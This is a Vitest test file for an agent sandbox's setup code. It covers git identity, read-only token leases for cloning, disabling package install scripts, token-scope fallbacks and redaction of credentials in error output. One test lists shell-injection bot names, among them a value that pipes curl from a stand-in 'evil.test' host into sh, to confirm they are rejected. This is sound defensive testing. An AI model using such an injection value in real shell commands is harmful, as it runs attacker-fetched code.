import { spawnSync } from "node:child_process";
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { GIT_BINARY } from "#lib/github/git-cli.js";
import { INSTALL_SCRIPTS_OFF_COMMAND } from "#lib/github/install-scripts.js";
import {
  leasePolicy,
  mintScopedToken,
  resetTokenScopeMemo,
  runLeasedGitCommand,
  SCOPE_DOWNGRADE_TTL_MS,
  TOKEN_SCOPES,
  type TokenMinter,
} from "#lib/github/lease.js";
import {
  cloneCommand,
  FACTORY_SANDBOX_CREATE_OPTIONS,
  factoryInit,
} from "#lib/github/repo-sandbox.js";
import {
  FACTORY_TOOLING_VERSION,
  installFactoryTooling,
} from "#lib/github/tooling.js";

const TOKEN = "ghs_INITTOKEN0123456789abcdefghijklmnop";

/**
 * Stands in for `VercelSandbox.environment`, so the sandbox modules can be
 * loaded and the create options each one passes can be read.
 */
vi.mock("eve/sandbox/vercel", async (original) => ({
  ...(await original<typeof import("eve/sandbox/vercel")>()),
  VercelSandbox: {
    environment: (createOptions: unknown) => ({ createOptions }),
  },
}));

/**
 * The connector's metadata is unreachable here, which is what a station
 * sees when Connect is briefly down: resolving the bot's name from it fails.
 */
vi.mock("@vercel/connect", async (original) => ({
  ...(await original<typeof import("@vercel/connect")>()),
  getConnectorMetadata: () =>
    Promise.reject(new Error("connector metadata unavailable")),
}));

type Step =
  | { kind: "policy"; policy: unknown }
  | { command: string; env: Record<string, string> | undefined; kind: "run" };

const fakeSandbox = (
  respond: (command: string) => {
    exitCode?: number;
    stderr?: string;
    stdout?: string;
  } = () => ({})
) => {
  const steps: Step[] = [];
  const sandbox = {
    name: "sbx_init",
    run: async ({
      command,
      env,
    }: {
      command: string;
      env?: Record<string, string>;
    }) => {
      steps.push({ command, env, kind: "run" });
      const result = respond(command);
      return {
        exitCode: result.exitCode ?? 0,
        stderr: result.stderr ?? "",
        stdout: result.stdout ?? "",
      };
    },
    setNetworkPolicy: async (policy: unknown) => {
      steps.push({ kind: "policy", policy });
    },
    writeTextFile: async () => undefined,
  };
  return { sandbox: sandbox as never, steps };
};

/** The clone is the image's own git, by absolute path, not the wrapper. */
const CLONE = `${GIT_BINARY} clone`;

const lease = () => {
  const requests: (readonly string[] | null)[] = [];
  const mint: TokenMinter = async (permissions) => {
    requests.push(permissions);
    return TOKEN;
  };
  return { dependencies: { id: () => "init", mint }, requests };
};

beforeEach(() => {
  resetTokenScopeMemo();
  vi.stubEnv("FACTORY_BOT_NAME", "foreman");
  vi.stubEnv("FACTORY_TOKEN_FALLBACK", "");
  vi.stubEnv("FACTORY_ALLOW_WORKFLOW_CHANGES", "");
  vi.stubEnv("FACTORY_ALLOW_INSTALL_SCRIPTS", "");
});

afterEach(() => {
  vi.unstubAllEnvs();
  vi.restoreAllMocks();
});

describe("factoryInit: a station's checkout", () => {
  test("sets the bot identity, then clones under a read-only lease that ends before anything else runs", async () => {
    vi.stubEnv("FACTORY_SETUP_COMMAND", "pnpm install");
    const { sandbox, steps } = fakeSandbox();
    const { dependencies, requests } = lease();
    await factoryInit(sandbox, dependencies);

    expect(
      steps.map((step) =>
        step.kind === "run"
          ? step.command.split(" ").slice(0, 2).join(" ")
          : `policy:${step.policy === "allow-all" ? "open" : "lease"}`
      )
    ).toEqual(["git config", "policy:lease", CLONE, "policy:open", "cd repo"]);
    expect(CLONE).toBe("/usr/bin/git clone");
    // Without the safe.directory entries every git command in the session
    // dies on "dubious ownership": the checkout belongs to the builder uid.
    expect(steps[0]?.kind === "run" && steps[0].command).toBe(
      `git config --global --add safe.directory /workspace && git config --global --add safe.directory /workspace/repo && git config --global user.name "foreman[bot]" && git config --global user.email "foreman[bot]@users.noreply.github.com" && ${INSTALL_SCRIPTS_OFF_COMMAND}`
    );
    expect(steps[1]).toEqual({
      kind: "policy",
      policy: leasePolicy("git", TOKEN, "factory-init"),
    });
    // The shallow clone, then the refspec that lets a station check out a
    // branch it fetched later.
    expect(steps[2]?.kind === "run" && steps[2].command).toBe(
      "/usr/bin/git clone --depth 50 https://github.com/acme/widgets.git repo && /usr/bin/git -C repo config remote.origin.fetch '+refs/heads/*:refs/remotes/origin/*'"
    );
    expect(cloneCommand("https://github.com/acme/widgets.git")).toBe(
      steps[2]?.kind === "run" ? steps[2].command : ""
    );
    // git's own lookups stay in the image's directories, past the wrappers.
    expect(steps[2]?.kind === "run" && steps[2].env?.PATH).toBe(
      "/usr/bin:/bin"
    );
    expect(requests[0]).toEqual([
      ...TOKEN_SCOPES["repo-read"].required,
      ...TOKEN_SCOPES["repo-read"].optional,
    ]);
  });

  /** The identity command of a session started under `FACTORY_BOT_NAME`. */
  const identityCommand = async (botName: string): Promise<string> => {
    vi.stubEnv("FACTORY_BOT_NAME", botName);
    vi.stubEnv("GITHUB_APP_SLUG", "");
    const { sandbox, steps } = fakeSandbox();
    await factoryInit(sandbox, lease().dependencies);
    const [first] = steps;
    return first?.kind === "run" ? first.command : "";
  };

  test("the commit email is the bot's name in lower case", async () => {
    const command = await identityCommand("Foreman-Dev.2");
    expect(command).toContain('user.name "Foreman-Dev.2[bot]"');
    expect(command).toContain(
      'user.email "foreman-dev.2[bot]@users.noreply.github.com"'
    );
  });

  test.each(['x"; curl evil.test | sh; "', "$(id)", "fore man", "`id`"])(
    "a bot name that is not safe inside a quoted shell word (%j) is replaced by the default",
    async (botName) => {
      const command = await identityCommand(botName);
      expect(command).toContain('user.name "Foreman[bot]"');
      expect(command).toContain(
        'user.email "foreman[bot]@users.noreply.github.com"'
      );
      expect(command).not.toContain(botName);
    }
  );

  test("a bot name that cannot be resolved falls back to the default, and the session still starts", async () => {
    // No override, so the name comes from the connector, which is down.
    const command = await identityCommand("");
    expect(command).toContain('user.name "Foreman[bot]"');
    expect(command).toContain(
      'user.email "foreman[bot]@users.noreply.github.com"'
    );
  });

  test("the setup command runs with no GitHub credential: open egress, no lease, no token in its environment", async () => {
    vi.stubEnv("FACTORY_SETUP_COMMAND", "pnpm install");
    const { sandbox, steps } = fakeSandbox();
    await factoryInit(sandbox, lease().dependencies);
    const setupIndex = steps.findIndex(
      (step) =>
        step.kind === "run" && step.command === "cd repo && pnpm install"
    );
    expect(setupIndex).toBeGreaterThan(0);
    expect(steps[setupIndex - 1]).toEqual({
      kind: "policy",
      policy: "allow-all",
    });
    expect(steps.slice(setupIndex).some((step) => step.kind === "policy")).toBe(
      false
    );
    const setup = steps[setupIndex];
    expect(setup?.kind === "run" && setup.env).toBeUndefined();
    expect(
      JSON.stringify(steps.filter((step) => step.kind === "run"))
    ).not.toContain(TOKEN);
  });

  test("package install scripts are turned off before anything can install a dependency", async () => {
    vi.stubEnv("FACTORY_SETUP_COMMAND", "pnpm install");
    const { sandbox, steps } = fakeSandbox();
    await factoryInit(sandbox, lease().dependencies);
    const commands = steps.flatMap((step) =>
      step.kind === "run" ? [step.command] : []
    );
    const settings = commands.findIndex((command) =>
      command.includes(INSTALL_SCRIPTS_OFF_COMMAND)
    );
    const setup = commands.indexOf("cd repo && pnpm install");
    expect(settings).toBe(0);
    expect(setup).toBeGreaterThan(settings);
  });

  test("FACTORY_ALLOW_INSTALL_SCRIPTS=1 leaves the package managers as they are", async () => {
    vi.stubEnv("FACTORY_ALLOW_INSTALL_SCRIPTS", "1");
    const { sandbox, steps } = fakeSandbox();
    await factoryInit(sandbox, lease().dependencies);
    const commands = steps.flatMap((step) =>
      step.kind === "run" ? [step.command] : []
    );
    expect(commands.join("\n")).not.toContain("ignore-scripts");
    expect(commands[0]).toMatch(/user\.email "[^"]+"$/);
  });

  test("without a setup command, nothing runs after the clone", async () => {
    const { sandbox, steps } = fakeSandbox();
    await factoryInit(sandbox, lease().dependencies);
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
    expect(steps.filter((step) => step.kind === "run")).toHaveLength(2);
  });

  test("a repository the app cannot see is reported as a missing repository, and the lease still ends", async () => {
    const { sandbox, steps } = fakeSandbox((command) =>
      command.startsWith(CLONE)
        ? {
            exitCode: 128,
            stderr:
              "remote: Repository not found.\nfatal: repository 'https://github.com/acme/widgets.git/' not found",
          }
        : {}
    );
    await expect(factoryInit(sandbox, lease().dependencies)).rejects.toThrow(
      /Cannot clone acme\/widgets: GitHub reports the repository as not found/
    );
    expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
  });

  test("a refused credential is reported as an app access problem", async () => {
    const { sandbox } = fakeSandbox((command) =>
      command.startsWith(CLONE)
        ? {
            exitCode: 128,
            stderr:
              "fatal: Authentication failed for 'https://github.com/acme/widgets.git/'",
          }
        : {}
    );
    await expect(factoryInit(sandbox, lease().dependencies)).rejects.toThrow(
      /Cannot access acme\/widgets\. Install the selected GitHub connector's app/
    );
  });

  test("a connector that cannot mint a token is reported the same way, before any clone is attempted", async () => {
    const { sandbox, steps } = fakeSandbox();
    await expect(
      factoryInit(sandbox, {
        mint: async () => {
          throw new Error("App authorization required");
        },
      })
    ).rejects.toThrow(/Cannot access acme\/widgets/);
    expect(
      steps.some(
        (step) => step.kind === "run" && step.command.startsWith(CLONE)
      )
    ).toBe(false);
    expect(steps.some((step) => step.kind === "policy")).toBe(false);
  });

  test("a failing setup command fails the session, with its output", async () => {
    vi.stubEnv("FACTORY_SETUP_COMMAND", "pnpm install");
    const { sandbox } = fakeSandbox((command) =>
      command.startsWith("cd repo")
        ? { exitCode: 1, stderr: "ERR_PNPM_OUTDATED_LOCKFILE" }
        : {}
    );
    await expect(factoryInit(sandbox, lease().dependencies)).rejects.toThrow(
      /ERR_PNPM_OUTDATED_LOCKFILE/
    );
  });

  test("a credential a failing setup command printed does not reach the error", async () => {
    vi.stubEnv("FACTORY_SETUP_COMMAND", "pnpm install");
    const printed = "ghp_0123456789abcdefghijklmnopqrstuvwxyz";
    const { sandbox } = fakeSandbox((command) =>
      command.startsWith("cd repo")
        ? { exitCode: 1, stderr: `npm ERR! 401 for token ${printed}` }
        : {}
    );
    const failure = await factoryInit(sandbox, lease().dependencies).catch(
      (error: unknown) => error
    );
    expect(failure).toBeInstanceOf(Error);
    const { message } = failure as Error;
    expect(message).toContain("npm ERR! 401 for token [redacted]");
    expect(message).not.toContain(printed);
  });
});

describe("runLeasedGitCommand", () => {
  test.each(["git clone x repo", "/usr/bin/git -C repo push origin main"])(
    "always leases the read-only scope, whatever the command: %s",
    async (command) => {
      const { sandbox, steps } = fakeSandbox();
      const { dependencies, requests } = lease();
      await runLeasedGitCommand(sandbox, command, dependencies);
      expect(requests).toEqual([
        [
          "contents:read",
          "issues:read",
          "pull_requests:read",
          "actions:read",
          "checks:read",
          "statuses:read",
        ],
      ]);
      // The command did run, under that lease.
      expect(steps.map((step) => step.kind)).toEqual([
        "policy",
        "run",
        "policy",
      ]);
    }
  );
});

describe("the token ladder", () => {
  const refusing = (
    accept: (permissions: readonly string[] | null) => boolean
  ) => {
    const requests: (readonly string[] | null)[] = [];
    const mint: TokenMinter = async (permissions) => {
      requests.push(permissions);
      if (!accept(permissions)) {
        throw new Error("refused");
      }
      return TOKEN;
    };
    return { mint, requests };
  };

  test("with FACTORY_TOKEN_FALLBACK=installation the last rung is the connector's installation token, and using it is logged", async () => {
    vi.stubEnv("FACTORY_TOKEN_FALLBACK", "installation");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    const { mint, requests } = refusing(() => false);
    const token = await mintScopedToken("repo-read", {
      installationToken: async () => "ghs_installation_token_0123456789abcdef",
      mint,
    });
    expect(token).toBe("ghs_installation_token_0123456789abcdef");
    expect(requests).toEqual([
      [
        ...TOKEN_SCOPES["repo-read"].required,
        ...TOKEN_SCOPES["repo-read"].optional,
      ],
      TOKEN_SCOPES["repo-read"].required,
      null,
    ]);
    expect(String(warn.mock.calls[0]?.[0])).toMatch(
      /unscoped installation token/
    );
  });

  test.each(["", "none", "off", "1", "true", "REPOSITORY-ish"])(
    "FACTORY_TOKEN_FALLBACK=%j never reaches the wide rungs",
    async (setting) => {
      vi.stubEnv("FACTORY_TOKEN_FALLBACK", setting);
      let installationCalls = 0;
      const { mint, requests } = refusing(() => false);
      await expect(
        mintScopedToken("repo-push", {
          installationToken: async () => {
            installationCalls += 1;
            return "ghs_never";
          },
          mint,
        })
      ).rejects.toThrow(/Could not mint a GitHub token/);
      expect(requests).toEqual([["contents:write"]]);
      expect(installationCalls).toBe(0);
    }
  );

  test("a narrower-than-ideal result is retried at full width once the memo expires", async () => {
    let clock = 1_000_000;
    const installation: { grantsChecks: boolean } = { grantsChecks: false };
    const { mint, requests } = refusing(
      (permissions) =>
        installation.grantsChecks ||
        !(permissions ?? []).includes("checks:read")
    );
    const dependencies = { mint, now: () => clock };
    await mintScopedToken("repo-read", dependencies);
    expect(requests).toHaveLength(2);

    // Within the window the remembered rung is used directly.
    clock += SCOPE_DOWNGRADE_TTL_MS - 1;
    await mintScopedToken("repo-read", dependencies);
    expect(requests).toHaveLength(3);
    expect(requests.at(-1)).toEqual(TOKEN_SCOPES["repo-read"].required);

    // After it, the full set is tried again, and this time the installation grants it.
    installation.grantsChecks = true;
    clock += 2;
    await mintScopedToken("repo-read", dependencies);
    expect(requests.at(-1)).toContain("checks:read");

    // A full-width result is remembered for good.
    clock += SCOPE_DOWNGRADE_TTL_MS * 100;
    await mintScopedToken("repo-read", dependencies);
    expect(requests.at(-1)).toContain("checks:read");
    expect(requests).toHaveLength(5);
  });

  test("a transient failure on every rung is not remembered", async () => {
    let fail = true;
    const { mint, requests } = refusing(() => !fail);
    await expect(mintScopedToken("repo-triage", { mint })).rejects.toThrow();
    fail = false;
    await mintScopedToken("repo-triage", { mint });
    expect(requests.at(-1)).toEqual([
      ...TOKEN_SCOPES["repo-triage"].required,
      ...TOKEN_SCOPES["repo-triage"].optional,
    ]);
  });
});

describe("sandbox tooling", () => {
  test("the shared create options install the tooling at build and are re-keyed by its version", () => {
    expect(FACTORY_SANDBOX_CREATE_OPTIONS.prepare).toBe(installFactoryTooling);
    expect(FACTORY_SANDBOX_CREATE_OPTIONS.env).toEqual({
      FACTORY_TOOLING_VERSION,
    });
  });

  test.each<[string, () => Promise<unknown>]>([
    ["agent/sandbox.ts", () => import("#sandbox.js")],
    [
      "agent/subagents/analyst/sandbox.ts",
      () => import("#subagents/analyst/sandbox.js"),
    ],
    [
      "agent/subagents/implementer/sandbox.ts",
      () => import("#subagents/implementer/sandbox.js"),
    ],
    [
      "agent/subagents/reviewer/sandbox.ts",
      () => import("#subagents/reviewer/sandbox.js"),
    ],
  ])("%s creates its environment with those options", async (_path, load) => {
    const { environment } = (await load()) as {
      environment: { createOptions: unknown };
    };
    expect(environment.createOptions).toBe(FACTORY_SANDBOX_CREATE_OPTIONS);
  });

  test("the installer puts gh and pnpm in place and checks the paths the tools invoke", async () => {
    const { sandbox, steps } = fakeSandbox();
    await installFactoryTooling(sandbox);
    const [run] = steps;
    const script = run?.kind === "run" ? run.command : "";
    expect(script.startsWith("set -e\n")).toBe(true);
    expect(script).toContain("apt-get install -y gh");
    expect(script).toContain("npm install -g pnpm@12.21.0");
    expect(script).toContain("[ -x /usr/bin/gh ]");
    expect(script).toContain("[ -x /usr/bin/git ]");
    expect(steps).toHaveLength(1);
  });

  test("the install script and the clone command are valid shell", async () => {
    const { sandbox, steps } = fakeSandbox();
    await installFactoryTooling(sandbox);
    const [run] = steps;
    for (const script of [
      run?.kind === "run" ? run.command : "exit 1 (",
      cloneCommand("https://github.com/acme/widgets.git"),
    ]) {
      const check = spawnSync("bash", ["-n", "-c", script], {
        encoding: "utf8",
      });
      expect(check.stderr).toBe("");
      expect(check.status).toBe(0);
    }
  });

  test("a failed install fails the build with the tail of the output", async () => {
    const { sandbox } = fakeSandbox(() => ({
      exitCode: 100,
      stderr: "E: Unable to locate package gh",
    }));
    await expect(installFactoryTooling(sandbox)).rejects.toThrow(
      /sandbox tooling failed \(exit 100\): E: Unable to locate package gh/
    );
  });
});
